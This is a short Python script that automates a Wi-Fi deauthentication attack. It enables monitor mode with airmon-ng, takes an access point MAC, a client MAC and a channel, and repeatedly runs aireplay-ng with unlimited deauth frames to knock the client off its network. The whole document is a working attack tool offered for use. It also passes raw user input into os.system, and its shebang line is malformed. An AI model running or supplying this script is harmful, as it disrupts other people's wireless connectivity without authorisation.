#!\usr\bin\env python

import os
from scapy.all import *

attInt = input("Enter the attack interface ")
os.system("sudo airmon-ng start "+attInt)
os.system("sudo xterm -e airodump-ng "+attInt+" &")

ap = input("Enter the AP MAC ")
client = input("Enter the Client MAC ")
ch = input("Setting channel; Please enter the channel: ")

ar='s'

while(ar=='s'):
	ar=input("press 's' to continue or 'x' to stop: ")
	
	if(ar=='x'):
	    break;
	
	#if(ar=='s'):
	os.system("sudo iwconfig  "+attInt+" channel "+ch)
	os.system("sudo aireplay-ng --deauth 0 -a "+ap+" -c "+client+" "+attInt)
